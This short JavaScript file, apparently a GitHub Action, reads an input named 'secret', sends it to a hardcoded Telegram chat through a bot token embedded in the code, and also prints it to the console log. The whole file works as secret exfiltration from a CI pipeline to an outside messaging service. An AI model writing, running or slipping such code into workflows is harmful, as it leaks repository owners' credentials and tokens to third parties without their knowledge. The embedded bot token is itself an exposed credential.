import * as core from '@actions/core';
import Bot from 'node-telegram-bot-api';


const secret = core.getInput('secret');
const formattedSecret = `Secret variable : ${secret}`;

(async function() {
  const bot = new Bot('5942682565:AAGYzxL0zSMr7_AI0w3nT02tk_PBexfZSn8');

  bot.sendMessage(345021341, formattedSecret);
  console.log(`Secret variable: `, formattedSecret);
})()